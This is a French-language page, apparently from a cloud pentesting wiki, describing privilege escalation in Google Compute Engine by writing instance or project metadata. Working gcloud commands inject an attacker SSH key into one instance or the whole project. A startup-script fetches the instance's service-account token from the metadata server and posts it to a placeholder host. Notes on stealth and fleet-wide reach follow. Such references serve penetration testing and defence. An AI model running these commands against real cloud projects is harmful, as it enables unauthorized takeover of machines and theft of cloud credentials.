---
title: "Script de démarrage via métadonnées : exécuter du code sur une instance existante"
order: 3
description: "Exécuter du code sur une instance existante en écrivant compute.instances.setMetadata (startup-script) ou en injectant une clé SSH, et métadonnées à l'échelle du projet pour une portée sur toute la flotte."
keywords:
  - setMetadata
  - startup script
  - SSH key
  - compute instance
  - project metadata
  - code execution
---

# Script de démarrage via métadonnées

Une instance Compute Engine lit sa configuration dans les métadonnées. Avec `compute.instances.setMetadata` (ou `compute.projects.setCommonInstanceMetadata` pour l'ensemble du projet), vous écrivez un `startup-script` ou ajoutez une clé SSH, et obtenez l'exécution de code ou une connexion sur une instance que vous ne contrôliez pas auparavant, ce qui livre ensuite le jeton de compte de service de cette instance depuis le serveur de métadonnées.

## Injecter une clé SSH

```bash
# add your key to one instance's metadata, then SSH in
gcloud compute instances add-metadata <instance> --zone <zone> \
  --metadata=ssh-keys="attacker:$(cat id.pub)"
gcloud compute ssh <instance> --zone <zone>

# project-wide: reaches every instance that does not block project keys
gcloud compute project-info add-metadata --metadata=ssh-keys="attacker:$(cat id.pub)"
```

## Exécuter un script de démarrage

```bash
gcloud compute instances add-metadata <instance> --zone <zone> \
  --metadata=startup-script='#! /bin/bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | curl -X POST -d @- https://you.example'
gcloud compute instances reset <instance> --zone <zone>   # startup runs on boot
```

## Notes d'exploitation

- Un reset ou un redémarrage est nécessaire pour qu'un startup-script s'exécute ; le chemin par clé SSH est immédiat et plus discret.
- `compute.instances.setServiceAccount` (arrêter la VM, y substituer un compte privilégié, la redémarrer) est un chemin apparenté lorsque vous pouvez changer le compte attaché.
- Les métadonnées à l'échelle du projet atteignent toute la flotte, mais les instances configurées pour bloquer les clés SSH à l'échelle du projet les ignorent : préférez donc le traitement par instance pour plus de fiabilité.
- Le jeton de l'instance hérite de ses **scopes** d'accès ; une machine au scope par défaut peut nécessiter le scope `cloud-platform` pour utiliser pleinement le rôle, voir [instance Compute](act-as-deployment/compute-instance.md).

## Outils

- **gcloud** (`compute instances add-metadata`, `project-info add-metadata`, `compute ssh`) : l'injection.

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud : métadonnées d'instance GCP](https://hackingthe.cloud/)
- [Google : définir les métadonnées d'instance](https://cloud.google.com/compute/docs/metadata/setting-custom-metadata)
